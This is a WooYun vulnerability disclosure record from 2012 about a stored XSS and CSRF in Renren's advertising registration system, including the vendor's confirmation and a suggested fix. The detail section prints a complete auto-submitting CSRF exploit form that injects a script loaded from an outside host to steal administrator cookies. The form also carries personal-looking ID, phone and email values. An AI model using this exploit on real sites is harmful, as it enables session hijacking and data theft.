{"id": 16428, "wybug_id": "wooyun-2012-012668", "wybug_title": "人人网xss偷管理员cookie+csrf", "wybug_corp": "人人网", "wybug_author": "FlyR4nk", "wybug_date": "2012-09-24 17:56", "wybug_open_date": "2012-11-08 17:57", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-09-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-09-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-10-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-10-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-10-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-11-08：\t细节向公众公开  简要描述： 人人某站存在xss，跟csrf，管理员审核相关信息时候触发。 详细说明：  人人广告系统注册中没有相关过滤，插入脚本\n\n提交后需要人工去审核。后期发现这个xss是可以弹的，说明在管理员查看界面也是可以弹的。\n\n并且提交表单存在csrf：可以构造如下表单提交：<html><H2>CSRF Exploit to add </H2><form accept-charset=\"utf-8\" method=\"POST\" action=\"http://bolt.jebe.renren.com/bolt/home/agree.htm\" name=\"form0\"><input type=\"hidden\" name=\"memberType\" value=\"2\"/><input type=\"hidden\" name=\"memberName\" value=\"flyrank\"/><input type=\"hidden\" name=\"identityNO\" value=\"211081196705041879\"/><input type=\"hidden\" name=\"telephone\" value=\"1111111111111\"/><input type=\"hidden\" name=\"mobile\" value=\"13661008645\"/><input type=\"hidden\" name=\"email\" value=\"79588329@qq.com\"/><input type=\"hidden\" name=\"domainName\" value=\"www.xxxx.com\"/><input type=\"hidden\" name=\"province\" value=\"0086110000000000\"/><input type=\"hidden\" name=\"city\" value=\"0\"/><input id=\"contactAddress\" type=\"hidden\" name=\"contactAddress\" value=\"%3Cscript%20src%3D%22http%3A%2F%2Fwww.codesec.org%2Fxss%2Ftest.js%22%3E%3C%2Fscript%3E\"/><input type=\"hidden\" name=\"postalCode\" value=\"234555\"/><input type=\"hidden\" name=\"industry\" value=\"201\"/><input type=\"hidden\" name=\"agreeCheck\" value=\"agree\"/></form><script type=\"text/javascript\">document.getElementById('contactAddress').value=decodeURIComponent(document.getElementById('contactAddress').value);document.form0.submit();//self.location.href = \"http://bolt.jebe.renren.com/bolt/member/preEditMember.htm\";</script></body></html>   漏洞证明：  \n\n\n\n\n\n   修复方案：  过滤相关标签，添加token等。   版权声明：转载请注明来源 FlyR4nk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2012-09-24 18:16 厂商回复： thx 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}